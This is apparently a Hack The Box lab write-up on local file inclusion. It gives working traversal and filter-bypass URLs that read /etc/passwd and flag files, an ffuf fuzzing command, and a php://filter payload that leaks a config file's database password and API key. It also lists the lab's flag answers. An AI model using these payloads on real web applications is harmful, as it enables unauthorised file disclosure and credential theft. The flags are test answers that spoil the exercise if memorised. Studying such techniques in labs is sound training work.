# HTB-File_Inclusion

## Table of Contents
1. [File Disclosure](#file-disclosure)
    1. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
    2. [Basic Bypasses](#basic-bypasses)
    3. [PHP Filters](#php-filters)

## File Disclosure
### Local File Inclusion (LFI)
#### Challenges
1. Using the file inclusion find the name of a user on the system that starts with "b".

    We can solve this by using path traversal and explore **/etc/passwd**.

    ```url
    http://83.136.255.170:50080/index.php?language=../../../../etc/passwd
    ```
    ![alt text](<Assets/Local File Inclusion (LFI) - 1.png>)

    We can see the answer in the bottom of the image. The answer is `barry`.

2. Submit the contents of the flag.txt file located in the /usr/share/flags directory.

    We can use this payload:

    ```url
    http://83.136.255.170:50080/index.php?language=../../../..//usr/share/flags/flag.txt
    ```

    The answer is `HTB{n3v3r_tru$t_u$3r_!nput}`.

### Basic Bypasses
#### Challenges
1. The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

    After doig trial and error, i found this as a correct payload:

    ```url
    http://94.237.61.249:34089/index.php?language=languages/....//....//....//....//flag.txt
    ```
    The answer is `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`.

### PHP Filters
#### Challenges
1. Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

    We can use **ffuf** to find other **.php** script.

    ```bash
    ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.56.175:54800/FUZZ.php
    ```

    ![alt text](<Assets/PHP Filters - 1.png>)

    After doing trial and error, the correct file is **configure**. Here the valid url:

    ```url
    http://94.237.56.175:54800/index.php?language=php://filter/read=convert.base64-encode/resource=configure
    ```
    We will get the base64 output. Then, we can decode it by using this command:

    ```bash
    echo 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d
    ```

    The answer is `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`.